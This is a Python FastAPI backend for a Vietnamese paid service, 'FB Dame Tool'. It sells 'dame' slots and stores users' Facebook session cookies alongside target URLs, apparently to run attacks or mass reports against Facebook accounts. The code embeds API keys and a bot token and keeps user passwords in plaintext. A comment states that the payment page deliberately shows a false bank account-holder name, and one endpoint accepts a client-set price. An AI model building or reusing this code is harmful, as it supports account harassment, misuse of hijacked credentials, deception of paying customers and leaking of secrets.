import asyncio, uuid, json, os, hashlib, secrets, re, time, random, string
from datetime import datetime
from fastapi import FastAPI, Request, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware

try: import aiohttp; HAS_AIOHTTP = True
except: HAS_AIOHTTP = False

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
app.mount("/static", StaticFiles(directory="static"), name="static")

TG_BOT_TOKEN   = "7818000635:AAGJ4troYL-SpYEfoTqxj_axm4B-YPt1hvU"
TG_ADMIN_ID    = 7454964260
RESEND_API_KEY = "re_Tj3Eyk2M_NgQf9E2sKdnmbSmdMsJefXpt"
FROM_EMAIL     = "onboarding@resend.dev"

# Bank info - thực tế gửi API là VAN THI KIM LIEN, hiển thị web là NGUYEN HOANG KHANH NAM
BANK_INFO = {
    "account_number": "6340127565",
    "account_name_real": "VAN THI KIM LIEN",   # dùng cho VietQR API
    "account_name_display": "NGUYEN HOANG KHANH NAM",  # hiển thị trên web
    "bank_code": "BIDV",
    "bank_bin": "970418",
}

import uuid as _uuid
otp_store   = {}
login_jobs  = {}

HISTORY_FILE      = "history.json"
USERS_FILE        = "users.json"
SESSIONS_FILE     = "sessions.json"
SERVERS_FILE      = "servers.json"
DEPOSIT_FILE      = "deposits.json"       # lịch sử nạp tiền
PURCHASE_FILE     = "purchases.json"      # lịch sử mua máy chủ
SLOTS_FILE        = "slots.json"          # user -> số slot dame (luồng dame)

ADMIN_ACCOUNTS = {
    "knammelbel206": hashlib.sha256("nqh300506".encode()).hexdigest()
}

# ── Gói dame slot ─────────────────────────────────────────────────────
# Mỗi "máy ảo" = 1 SLOT DAME = 1 luồng dame chạy độc lập
# user mua gói thì slot_count tăng, mỗi slot có 1 server_id riêng
DAME_SLOT_PLANS = [
    # ═══ THEO NGÀY (tab ngày — min 1 ngày) ═══
    {"id":"sl_1x1d",  "name":"1 Máy ảo · 1 ngày",      "slots":1,  "days":1,   "price":30000,   "popular":False},
    {"id":"sl_1x2d",  "name":"1 Máy ảo · 2 ngày",      "slots":1,  "days":2,   "price":55000,   "popular":False},
    {"id":"sl_1x3d",  "name":"1 Máy ảo · 3 ngày",      "slots":1,  "days":3,   "price":79000,   "popular":False},
    {"id":"sl_3x1d",  "name":"3 Máy ảo · 1 ngày",      "slots":3,  "days":1,   "price":79000,   "popular":False},
    {"id":"sl_3x3d",  "name":"3 Máy ảo · 3 ngày",      "slots":3,  "days":3,   "price":199000,  "popular":True},
    {"id":"sl_5x1d",  "name":"5 Máy ảo · 1 ngày",      "slots":5,  "days":1,   "price":119000,  "popular":False},
    {"id":"sl_5x3d",  "name":"5 Máy ảo · 3 ngày",      "slots":5,  "days":3,   "price":299000,  "popular":False},
    {"id":"sl_10x1d", "name":"10 Máy ảo · 1 ngày",     "slots":10, "days":1,   "price":199000,  "popular":False},
    {"id":"sl_10x3d", "name":"10 Máy ảo · 3 ngày",     "slots":10, "days":3,   "price":499000,  "popular":True},
    {"id":"sl_20x1d", "name":"20 Máy ảo · 1 ngày",     "slots":20, "days":1,   "price":349000,  "popular":False},
    {"id":"sl_20x3d", "name":"20 Máy ảo · 3 ngày",     "slots":20, "days":3,   "price":849000,  "popular":False},
    # ═══ THEO TUẦN (tab tuần — min 1 tuần = 7 ngày) ═══
    {"id":"sl_1x1w",  "name":"1 Máy ảo · 1 tuần",      "slots":1,  "days":7,   "price":149000,  "popular":False},
    {"id":"sl_1x2w",  "name":"1 Máy ảo · 2 tuần",      "slots":1,  "days":14,  "price":249000,  "popular":False},
    {"id":"sl_3x1w",  "name":"3 Máy ảo · 1 tuần",      "slots":3,  "days":7,   "price":379000,  "popular":True},
    {"id":"sl_3x2w",  "name":"3 Máy ảo · 2 tuần",      "slots":3,  "days":14,  "price":599000,  "popular":False},
    {"id":"sl_5x1w",  "name":"5 Máy ảo · 1 tuần",      "slots":5,  "days":7,   "price":549000,  "popular":False},
    {"id":"sl_5x2w",  "name":"5 Máy ảo · 2 tuần",      "slots":5,  "days":14,  "price":899000,  "popular":False},
    {"id":"sl_10x1w", "name":"10 Máy ảo · 1 tuần",     "slots":10, "days":7,   "price":949000,  "popular":True},
    {"id":"sl_10x2w", "name":"10 Máy ảo · 2 tuần",     "slots":10, "days":14,  "price":1599000, "popular":False},
    {"id":"sl_20x1w", "name":"20 Máy ảo · 1 tuần",     "slots":20, "days":7,   "price":1699000, "popular":False},
    # ═══ THEO THÁNG (tab tháng — min 1 tháng = 30 ngày) ═══
    {"id":"sl_1x1m",  "name":"1 Máy ảo · 1 tháng",     "slots":1,  "days":30,  "price":499000,  "popular":True},
    {"id":"sl_1x3m",  "name":"1 Máy ảo · 3 tháng",     "slots":1,  "days":90,  "price":1199000, "popular":False},
    {"id":"sl_1x6m",  "name":"1 Máy ảo · 6 tháng",     "slots":1,  "days":180, "price":1999000, "popular":False},
    {"id":"sl_3x1m",  "name":"3 Máy ảo · 1 tháng",     "slots":3,  "days":30,  "price":1299000, "popular":True},
    {"id":"sl_3x3m",  "name":"3 Máy ảo · 3 tháng",     "slots":3,  "days":90,  "price":2999000, "popular":False},
    {"id":"sl_5x1m",  "name":"5 Máy ảo · 1 tháng",     "slots":5,  "days":30,  "price":1999000, "popular":False},
    {"id":"sl_5x3m",  "name":"5 Máy ảo · 3 tháng",     "slots":5,  "days":90,  "price":4499000, "popular":False},
    {"id":"sl_10x1m", "name":"10 Máy ảo · 1 tháng",    "slots":10, "days":30,  "price":3499000, "popular":True},
    {"id":"sl_10x3m", "name":"10 Máy ảo · 3 tháng",    "slots":10, "days":90,  "price":7999000, "popular":False},
    {"id":"sl_20x1m", "name":"20 Máy ảo · 1 tháng",    "slots":20, "days":30,  "price":5999000, "popular":False},
    # ═══ THEO NĂM (tab năm — min 1 năm = 365 ngày) ═══
    {"id":"sl_1x1y",  "name":"1 Máy ảo · 1 năm",       "slots":1,  "days":365, "price":4999000, "popular":True},
    {"id":"sl_3x1y",  "name":"3 Máy ảo · 1 năm",       "slots":3,  "days":365, "price":12999000,"popular":False},
    {"id":"sl_5x1y",  "name":"5 Máy ảo · 1 năm",       "slots":5,  "days":365, "price":19999000,"popular":False},
    {"id":"sl_10x1y", "name":"10 Máy ảo · 1 năm",      "slots":10, "days":365, "price":34999000,"popular":True},
    # ═══ COMBO ĐẶC BIỆT (scroll dọc riêng) ═══
    {"id":"sl_s1",    "name":"Starter · 2 Máy · 1 tuần",    "slots":2,  "days":7,   "price":199000,  "popular":False},
    {"id":"sl_s2",    "name":"Basic · 3 Máy · 2 tuần",      "slots":3,  "days":14,  "price":449000,  "popular":False},
    {"id":"sl_s3",    "name":"Pro · 5 Máy · 2 tuần",        "slots":5,  "days":14,  "price":699000,  "popular":True},
    {"id":"sl_s4",    "name":"Business · 5 Máy · 1 tháng",  "slots":5,  "days":30,  "price":1499000, "popular":False},
    {"id":"sl_s5",    "name":"Elite · 10 Máy · 2 tuần",     "slots":10, "days":14,  "price":1299000, "popular":False},
    {"id":"sl_s6",    "name":"Elite Plus · 10 Máy · 1 tháng","slots":10,"days":30,  "price":2999000, "popular":True},
    {"id":"sl_s7",    "name":"Ultimate · 20 Máy · 1 tháng", "slots":20, "days":30,  "price":4999000, "popular":True},
    {"id":"sl_s8",    "name":"Mega · 50 Máy · 1 tháng",     "slots":50, "days":30,  "price":10999000,"popular":False},
    {"id":"sl_free",  "name":"🎁 Free · 1 Máy · 3 ngày",   "slots":1,  "days":3,   "price":0,       "popular":False,"trial":True},
]

# ────────────────────────────────────────────────────────
def _load(path, default):
    if not os.path.exists(path): return default
    try:
        with open(path,"r",encoding="utf-8") as f: return json.load(f)
    except: return default

def _save(path, data):
    with open(path,"w",encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_history():   return _load(HISTORY_FILE, [])
def save_history(r):  _save(HISTORY_FILE, r)
def load_users():     return _load(USERS_FILE, {})
def save_users(u):    _save(USERS_FILE, u)
def load_sessions():  return _load(SESSIONS_FILE, {})
def save_sessions(s): _save(SESSIONS_FILE, s)
def load_servers():   return _load(SERVERS_FILE, [])
def save_servers(s):  _save(SERVERS_FILE, s)
def load_deposits():  return _load(DEPOSIT_FILE, [])
def save_deposits(d): _save(DEPOSIT_FILE, d)
def load_purchases(): return _load(PURCHASE_FILE, [])
def save_purchases(p):_save(PURCHASE_FILE, p)
def load_slots():     return _load(SLOTS_FILE, {})
def save_slots(s):    _save(SLOTS_FILE, s)

def add_history(record):
    records = load_history(); records.insert(0,record); save_history(records[:500])

def hash_pw(pw): return hashlib.sha256(pw.encode()).hexdigest()

def gen_order_id():
    return "NAP" + "".join(random.choices(string.digits, k=8))

def create_session(username:str) -> str:
    token = secrets.token_hex(32)
    sessions = load_sessions()
    sessions[token] = {"username":username,"created":datetime.now().isoformat()}
    save_sessions(sessions)
    return token

def get_session_user(token:str):
    if not token: return None
    s = load_sessions().get(token)
    return s["username"] if s else None

def is_admin(username:str) -> bool:
    return username in ADMIN_ACCOUNTS

def get_token(request:Request) -> str:
    auth = request.headers.get("Authorization","")
    if auth.startswith("Bearer "): return auth[7:]
    return request.cookies.get("session_token","")

def get_user_balance(username:str) -> int:
    users = load_users()
    if username not in users: return 0
    return users[username].get("balance", 0)

def adjust_balance(username:str, delta:int):
    users = load_users()
    if username not in users: return
    users[username]["balance"] = users[username].get("balance",0) + delta
    save_users(users)

async def tg(text:str):
    if not HAS_AIOHTTP: return
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    async with aiohttp.ClientSession() as s:
        try:
            await s.post(url, json={"chat_id":TG_ADMIN_ID,"text":text,
                "parse_mode":"HTML","disable_web_page_preview":True},
                timeout=aiohttp.ClientTimeout(total=8))
        except: pass

# ════════════════════════════════════════════════════════
# BASIC ROUTES
# ════════════════════════════════════════════════════════
@app.get("/")
async def root(): return FileResponse("static/index.html")

@app.get("/api/vps-plans")
async def api_vps_plans():
    return JSONResponse(DAME_SLOT_PLANS)

# ════════════════════════════════════════════════════════
# AUTH  (bỏ register - chỉ giữ login)
# ════════════════════════════════════════════════════════
@app.post("/api/login")
async def login(request:Request):
    data     = await request.json()
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()
    if not username or not password: raise HTTPException(400,"Thiếu thông tin")
    if username in ADMIN_ACCOUNTS:
        if ADMIN_ACCOUNTS[username] != hash_pw(password): raise HTTPException(401,"Sai mật khẩu")
        return JSONResponse({"ok":True,"token":create_session(username),"username":username,"is_admin":True,"balance":0})
    users = load_users()
    user  = users.get(username)
    if not user: raise HTTPException(401,"Tài khoản không tồn tại")
    if not user.get("active",True): raise HTTPException(403,"Tài khoản bị khóa")
    if user["password"] != hash_pw(password): raise HTTPException(401,"Sai mật khẩu")
    balance = user.get("balance",0)
    return JSONResponse({"ok":True,"token":create_session(username),"username":username,"is_admin":False,"balance":balance})

@app.post("/api/logout")
async def logout(request:Request):
    token = get_token(request)
    if token:
        s = load_sessions(); s.pop(token,None); save_sessions(s)
    return JSONResponse({"ok":True})

@app.get("/api/me")
async def api_me(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    users = load_users()
    if is_admin(username):
        return JSONResponse({"username":username,"is_admin":True,"balance":0,"email":"admin@system","created":"--"})
    user = users.get(username,{})
    return JSONResponse({"username":username,"is_admin":False,
        "balance":user.get("balance",0),"email":user.get("email",""),"created":user.get("created","")})

@app.post("/api/change-password")
async def change_password(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    if is_admin(username): raise HTTPException(403,"Admin dùng cách khác")
    data   = await request.json()
    old_pw = (data.get("old_password") or "").strip()
    new_pw = (data.get("new_password") or "").strip()
    if not old_pw or not new_pw: raise HTTPException(400,"Thiếu thông tin")
    if len(new_pw) < 6: raise HTTPException(400,"Mật khẩu mới tối thiểu 6 ký tự")
    users = load_users()
    if users[username]["password"] != hash_pw(old_pw): raise HTTPException(400,"Mật khẩu hiện tại sai")
    users[username]["password"] = hash_pw(new_pw)
    users[username]["password_plain"] = new_pw
    save_users(users)
    return JSONResponse({"ok":True})

# ════════════════════════════════════════════════════════
# FORGOT PASSWORD
# ════════════════════════════════════════════════════════
@app.post("/api/forgot-password")
async def forgot_password(request:Request):
    import threading, random as _r
    data  = await request.json()
    email = (data.get("email") or "").strip().lower()
    if not email.endswith("@gmail.com"): raise HTTPException(400,"Chỉ @gmail.com")
    users = load_users()
    user  = next((u for u,d in users.items() if d.get("email","").lower()==email), None)
    if not user: raise HTTPException(404,"Email chưa đăng ký")
    import random as _r2
    otp = str(_r2.randint(100000,999999))
    otp_store[email] = {"otp":otp,"expires":time.time()+300,"username":user}
    def _send():
        try:
            import resend; resend.api_key = RESEND_API_KEY
            resend.Emails.send({"from":FROM_EMAIL,"to":email,
                "subject":"OTP đặt lại mật khẩu — FB Dame Tool",
                "html":f"<p>Mã OTP: <b>{otp}</b> (hết hạn 5 phút)</p>"})
        except: pass
    threading.Thread(target=_send, daemon=True).start()
    return JSONResponse({"ok":True})

@app.post("/api/verify-otp")
async def verify_otp(request:Request):
    data  = await request.json()
    email = (data.get("email") or "").strip().lower()
    otp   = (data.get("otp") or "").strip()
    rec   = otp_store.get(email)
    if not rec: raise HTTPException(400,"OTP không hợp lệ")
    if time.time() > rec["expires"]: otp_store.pop(email,None); raise HTTPException(400,"OTP hết hạn")
    if rec["otp"] != otp: raise HTTPException(400,"OTP sai")
    return JSONResponse({"ok":True})

@app.post("/api/reset-password")
async def reset_password(request:Request):
    data   = await request.json()
    email  = (data.get("email") or "").strip().lower()
    otp    = (data.get("otp") or "").strip()
    new_pw = (data.get("new_password") or "").strip()
    if not all([email,otp,new_pw]): raise HTTPException(400,"Thiếu thông tin")
    if len(new_pw) < 6: raise HTTPException(400,"Mật khẩu ≥ 6 ký tự")
    rec = otp_store.get(email)
    if not rec: raise HTTPException(400,"OTP không hợp lệ")
    if time.time() > rec["expires"]: raise HTTPException(400,"OTP hết hạn")
    if rec["otp"] != otp: raise HTTPException(400,"OTP sai")
    users = load_users(); uname = rec["username"]
    if uname not in users: raise HTTPException(404,"Tài khoản không tồn tại")
    users[uname]["password"] = hash_pw(new_pw)
    users[uname]["password_plain"] = new_pw
    save_users(users); otp_store.pop(email,None)
    return JSONResponse({"ok":True})

# ════════════════════════════════════════════════════════
# HISTORY
# ════════════════════════════════════════════════════════
@app.get("/api/history")
async def get_history(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    records = load_history()
    if not is_admin(username):
        records = [r for r in records if r.get("owner")==username]
    return JSONResponse(records)

# ════════════════════════════════════════════════════════
# DEPOSIT (NẠP TIỀN)
# ════════════════════════════════════════════════════════
@app.post("/api/deposit/create")
async def deposit_create(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    if is_admin(username): raise HTTPException(403,"Admin không cần nạp tiền")
    data   = await request.json()
    amount = int(data.get("amount",0))
    if amount < 20000: raise HTTPException(400,"Số tiền tối thiểu 20.000đ")

    order_id = gen_order_id()
    content  = f"NAP {username} {order_id}"
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    # VietQR URL dùng account_name_real
    qr_url = (
        f"https://img.vietqr.io/image/"
        f"{BANK_INFO['bank_bin']}-"
        f"{BANK_INFO['account_number']}-"
        f"compact.png?"
        f"amount={amount}&"
        f"addInfo={content.replace(' ','%20')}&"
        f"accountName={BANK_INFO['account_name_real'].replace(' ','%20')}"
    )

    deposit = {
        "order_id": order_id,
        "username": username,
        "amount": amount,
        "content": content,
        "qr_url": qr_url,
        "status": "pending",   # pending | approved | rejected
        "created": now,
    }
    deposits = load_deposits()
    deposits.insert(0, deposit)
    save_deposits(deposits)

    # Gửi Telegram để admin duyệt
    asyncio.create_task(tg(
        f"💰 <b>YÊU CẦU NẠP TIỀN</b>\n"
        f"👤 User: <code>{username}</code>\n"
        f"💵 Số tiền: <b>{amount:,} đ</b>\n"
        f"🆔 Mã đơn: <code>{order_id}</code>\n"
        f"📝 Nội dung CK: <code>{content}</code>\n"
        f"🕐 {now}\n\n"
        f"✅ /approve_{order_id}  ❌ /reject_{order_id}"
    ))

    return JSONResponse({
        "ok": True,
        "order_id": order_id,
        "qr_url": qr_url,
        "content": content,
        "bank_number": BANK_INFO["account_number"],
        "bank_name": BANK_INFO["bank_code"],
        "account_name": BANK_INFO["account_name_display"],  # hiển thị cho user
        "amount": amount,
    })

@app.get("/api/deposit/history")
async def deposit_history(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    deposits = load_deposits()
    if not is_admin(username):
        deposits = [d for d in deposits if d.get("username")==username]
    return JSONResponse(deposits[:100])

# ════════════════════════════════════════════════════════
# ADMIN - QUẢN LÝ
# ════════════════════════════════════════════════════════
@app.get("/api/admin/users")
async def admin_users(request:Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403,"Không có quyền")
    users = load_users()
    items = [{"username":u, **{k:v for k,v in d.items() if k!="password"}} for u,d in users.items()]
    items.sort(key=lambda x:x.get("created",""), reverse=True)
    return JSONResponse(items)

@app.post("/api/admin/add-balance")
async def admin_add_balance(request:Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403,"Không có quyền")
    data   = await request.json()
    target = (data.get("username") or "").strip()
    amount = int(data.get("amount", 0))
    if amount <= 0: raise HTTPException(400,"Số tiền phải > 0")
    users = load_users()
    if target not in users: raise HTTPException(404,"User không tồn tại")
    users[target]["balance"] = users[target].get("balance",0) + amount
    save_users(users)
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    # Ghi lịch sử nạp
    deposits = load_deposits()
    deposits.insert(0, {
        "order_id": "ADMIN_"+gen_order_id(),
        "username": target,
        "amount": amount,
        "content": f"Admin cộng tiền ({username})",
        "status": "approved",
        "created": now,
        "by_admin": True,
    })
    save_deposits(deposits)
    asyncio.create_task(tg(f"👑 Admin cộng <b>{amount:,}đ</b> cho <code>{target}</code> | {now}"))
    return JSONResponse({"ok":True,"new_balance":users[target]["balance"]})

@app.post("/api/admin/sub-balance")
async def admin_sub_balance(request:Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403,"Không có quyền")
    data   = await request.json()
    target = (data.get("username") or "").strip()
    amount = int(data.get("amount", 0))
    if amount <= 0: raise HTTPException(400,"Số tiền phải > 0")
    users = load_users()
    if target not in users: raise HTTPException(404,"User không tồn tại")
    cur = users[target].get("balance",0)
    users[target]["balance"] = max(0, cur - amount)
    save_users(users)
    asyncio.create_task(tg(f"👑 Admin trừ <b>{amount:,}đ</b> của <code>{target}</code>"))
    return JSONResponse({"ok":True,"new_balance":users[target]["balance"]})

@app.post("/api/admin/approve-deposit")
async def admin_approve_deposit(request:Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403,"Không có quyền")
    data     = await request.json()
    order_id = data.get("order_id","")
    deposits = load_deposits()
    dep = next((d for d in deposits if d["order_id"]==order_id), None)
    if not dep: raise HTTPException(404,"Không tìm thấy đơn")
    if dep["status"] != "pending": raise HTTPException(400,"Đơn đã xử lý")
    dep["status"] = "approved"
    dep["approved_at"] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    save_deposits(deposits)
    # Cộng tiền
    users = load_users()
    target = dep["username"]
    if target in users:
        users[target]["balance"] = users[target].get("balance",0) + dep["amount"]
        save_users(users)
    asyncio.create_task(tg(f"✅ Duyệt nạp <b>{dep['amount']:,}đ</b> cho <code>{target}</code>"))
    return JSONResponse({"ok":True})

@app.post("/api/admin/reject-deposit")
async def admin_reject_deposit(request:Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403,"Không có quyền")
    data     = await request.json()
    order_id = data.get("order_id","")
    deposits = load_deposits()
    dep = next((d for d in deposits if d["order_id"]==order_id), None)
    if not dep: raise HTTPException(404,"Không tìm thấy đơn")
    dep["status"] = "rejected"
    save_deposits(deposits)
    return JSONResponse({"ok":True})

@app.post("/api/admin/create-user")
async def admin_create_user(request:Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403,"Không có quyền")
    data = await request.json()
    uname = (data.get("username") or "").strip()
    pw    = (data.get("password") or "").strip()
    email = (data.get("email") or "").strip()
    if not all([uname,pw,email]): raise HTTPException(400,"Thiếu thông tin")
    if len(uname)<4: raise HTTPException(400,"Username ≥ 4 ký tự")
    if len(pw)<6: raise HTTPException(400,"Mật khẩu ≥ 6 ký tự")
    users = load_users()
    if uname in users or uname in ADMIN_ACCOUNTS: raise HTTPException(400,"Username đã tồn tại")
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    users[uname] = {
        "password": hash_pw(pw), "password_plain": pw,
        "email": email, "created": now, "active": True, "balance": 0,
        "free_slot_used": False,
    }
    save_users(users)
    # Tạo 1 máy ảo miễn phí
    _grant_free_slot(uname)
    return JSONResponse({"ok":True})

@app.post("/api/admin/toggle-user")
async def admin_toggle(request:Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403,"Không có quyền")
    data = await request.json(); target = data.get("username","")
    users = load_users()
    if target not in users: raise HTTPException(404,"Không tìm thấy")
    users[target]["active"] = data.get("active",True); save_users(users)
    return JSONResponse({"ok":True})

@app.post("/api/admin/delete-user")
async def admin_delete(request:Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403,"Không có quyền")
    data = await request.json(); target = data.get("username","")
    users = load_users()
    if target not in users: raise HTTPException(404,"Không tìm thấy")
    del users[target]; save_users(users)
    return JSONResponse({"ok":True})

@app.get("/api/admin/deposits")
async def admin_deposits(request:Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403,"Không có quyền")
    return JSONResponse(load_deposits())

@app.get("/api/purchase/history")
async def purchase_history(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    purchases = load_purchases()
    if not is_admin(username):
        purchases = [p for p in purchases if p.get("username")==username]
    return JSONResponse(purchases[:100])

# ════════════════════════════════════════════════════════
# DAME SLOTS (thay thế VPS Pool)
# Mỗi slot = 1 luồng dame độc lập. user có N slot thì chạy N dame cùng lúc.
# Dữ liệu slot lưu vào users[username]["slots"] = [{id, expires_at, ...}]
# ════════════════════════════════════════════════════════

def get_user_slots(username:str) -> list:
    """Lấy danh sách slot dame còn hạn của user"""
    users = load_users()
    if username not in users: return []
    now = datetime.now()
    slots = users[username].get("slots", [])
    valid = []
    for s in slots:
        if s.get("expires_at") is None:  # không giới hạn
            valid.append(s)
        else:
            try:
                exp = datetime.strptime(s["expires_at"], "%d/%m/%Y %H:%M:%S")
                if exp > now: valid.append(s)
            except: valid.append(s)
    return valid

def count_user_slots(username:str) -> int:
    return len(get_user_slots(username))

def _grant_free_slot(username:str):
    """Cấp 1 slot miễn phí cho TK mới (3 ngày)"""
    from datetime import timedelta
    users = load_users()
    if username not in users: return
    exp = (datetime.now() + timedelta(days=3)).strftime("%d/%m/%Y %H:%M:%S")
    slot = {
        "id": "SL" + "".join(random.choices(string.digits+string.ascii_uppercase, k=8)),
        "plan": "free_trial",
        "plan_name": "Free slot (TK mới · 3 ngày)",
        "slots_in_pack": 1,
        "expires_at": exp,
        "created": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
    }
    users[username].setdefault("slots", []).append(slot)
    save_users(users)

@app.get("/api/slots/my")
async def slots_my(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    slots = get_user_slots(username)
    total = len(slots)
    # Lấy danh sách server_id đang chạy của user
    running_servers = load_servers()
    running_servers = [s for s in running_servers if s.get("owner")==username]
    running_count   = len([s for s in running_servers if s.get("status")=="running"])
    return JSONResponse({
        "total_slots": total,
        "used_slots": running_count,
        "free_slots": max(0, total - running_count),
        "slots": slots,
    })

@app.get("/api/slots/count")
async def slots_count(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    return JSONResponse({"total_slots": count_user_slots(username)})

@app.post("/api/slots/buy")
async def slots_buy(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    if is_admin(username): raise HTTPException(403,"Admin không mua slot")
    data    = await request.json()
    plan_id = data.get("plan_id","")
    plan    = next((p for p in DAME_SLOT_PLANS if p["id"]==plan_id), None)
    # Custom plan (mua máy lẻ tuỳ chọn từ frontend)
    if not plan and data.get("custom"):
        try:
            slots_c = int(data.get("slots",1))
            days_c  = int(data.get("days",1))
            price_c = int(data.get("price",0))
            name_c  = str(data.get("name","Máy lẻ tuỳ chọn"))
            if slots_c<1 or days_c<1 or price_c<0: raise ValueError("invalid")
            plan = {"id":plan_id,"name":name_c,"slots":slots_c,"days":days_c,"price":price_c}
        except:
            raise HTTPException(400,"Gói không hợp lệ")
    if not plan: raise HTTPException(400,"Gói không tồn tại")

    price = plan.get("price",0)
    users = load_users()
    if username not in users: raise HTTPException(401,"Lỗi user")
    balance = users[username].get("balance",0)

    # Trial: mỗi TK chỉ 1 lần
    if plan.get("trial"):
        if users[username].get("free_slot_used"):
            raise HTTPException(400,"Bạn đã sử dụng gói miễn phí rồi")

    if balance < price: raise HTTPException(400,f"Số dư không đủ. Cần {price:,}đ, có {balance:,}đ")

    from datetime import timedelta
    slots_count = plan.get("slots",1)
    days        = plan.get("days",30)
    expires     = (datetime.now() + timedelta(days=days)).strftime("%d/%m/%Y %H:%M:%S")
    now         = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    # Trừ tiền
    users[username]["balance"] = balance - price
    if plan.get("trial"): users[username]["free_slot_used"] = True

    # Thêm các slot vào user
    pack_id = "PCK" + "".join(random.choices(string.digits+string.ascii_uppercase, k=8))
    new_slots = []
    for i in range(slots_count):
        slot = {
            "id": "SL" + "".join(random.choices(string.digits+string.ascii_uppercase, k=8)),
            "pack_id": pack_id,
            "plan": plan_id,
            "plan_name": plan["name"],
            "slot_index": i+1,
            "slots_in_pack": slots_count,
            "expires_at": expires,
            "created": now,
        }
        users[username].setdefault("slots", []).append(slot)
        new_slots.append(slot)

    save_users(users)

    # Lưu lịch sử mua
    purchases = load_purchases()
    purchases.insert(0, {
        "id": pack_id,
        "username": username,
        "plan_id": plan_id,
        "plan_name": plan["name"],
        "qty": slots_count,
        "price": price,
        "expires_at": expires,
        "created": now,
        "slot_ids": [s["id"] for s in new_slots],
    })
    save_purchases(purchases)

    asyncio.create_task(tg(
        f"🛒 <b>MUA SLOT DAME</b>\n"
        f"👤 User: <code>{username}</code>\n"
        f"📦 Gói: {plan['name']}\n"
        f"🔢 Số slot: {slots_count}\n"
        f"💰 Giá: {price:,}đ\n"
        f"⏰ Hết hạn: {expires}\n"
        f"🕐 {now}"
    ))

    return JSONResponse({
        "ok": True,
        "slots_bought": slots_count,
        "expires_at": expires,
        "new_balance": users[username]["balance"],
        "total_slots": count_user_slots(username),
    })

@app.post("/api/admin/grant-slots")
async def admin_grant_slots(request:Request):
    username = get_session_user(get_token(request))
    if not username or not is_admin(username): raise HTTPException(403,"Không có quyền")
    data   = await request.json()
    target = data.get("username","")
    qty    = int(data.get("qty",1))
    days   = int(data.get("days",30))
    from datetime import timedelta
    users = load_users()
    if target not in users: raise HTTPException(404,"User không tồn tại")
    expires = (datetime.now() + timedelta(days=days)).strftime("%d/%m/%Y %H:%M:%S")
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    for i in range(qty):
        slot = {
            "id": "SL" + "".join(random.choices(string.digits+string.ascii_uppercase, k=8)),
            "plan": "admin_grant",
            "plan_name": f"Admin tặng ({username})",
            "slot_index": i+1,
            "slots_in_pack": qty,
            "expires_at": expires,
            "created": now,
        }
        users[target].setdefault("slots", []).append(slot)
    save_users(users)
    asyncio.create_task(tg(f"👑 Admin tặng {qty} slot cho <code>{target}</code> · hết hạn {expires}"))
    return JSONResponse({"ok":True,"total_slots":count_user_slots(target)})


# ════════════════════════════════════════════════════════
# SERVERS (máy chủ dame - giữ nguyên)
# ════════════════════════════════════════════════════════
@app.get("/api/servers")
async def api_get_servers(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    servers = load_servers()
    if not is_admin(username):
        servers = [s for s in servers if s.get("owner")==username]
    return JSONResponse(servers)

@app.post("/api/servers")
async def api_create_server(request:Request):
    username = get_session_user(get_token(request))
    if not username: raise HTTPException(401,"Chưa đăng nhập")
    data = await request.json()
    name       = (data.get("name") or "").strip()
    cookie     = (data.get("cookie") or "").strip()
    target_url = (data.get("target_url") or "").strip()
    speed      = data.get("speed","normal")
    acc_name   = data.get("acc_name","")
    acc_uid    = data.get("acc_uid","")
    target_name= data.get("target_name","")
    if not cookie or not target_url:
        raise HTTPException(400,"Thiếu cookie hoặc target")
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    server = {
        "id": "dzixmode" + "".join([str(random.randint(0,9)) for _ in range(6)]),
        "owner": username, "name": name or f"Máy chủ {now}",
        "cookie": cookie, "target_url": target_url, "target_name": target_name,
        "acc_name": acc_name, "acc_uid": acc_uid, "speed": speed,
        "status": "ready", "created": now
    }
    servers = load_servers(); servers.insert(0,server); save_servers(servers)
    asyncio.create_task(tg(
        f"🖥 <b>Tạo máy chủ mới</b>\n"
        f"👤 User: <code>{username}</code>\n"
        f"📛 Tên: {server['name']}\n"
        f"🎯 Target: {target_name or target_url}\n"
        f"🕐 {now}"
    ))
    return JSONResponse({"ok":True,"server":server})

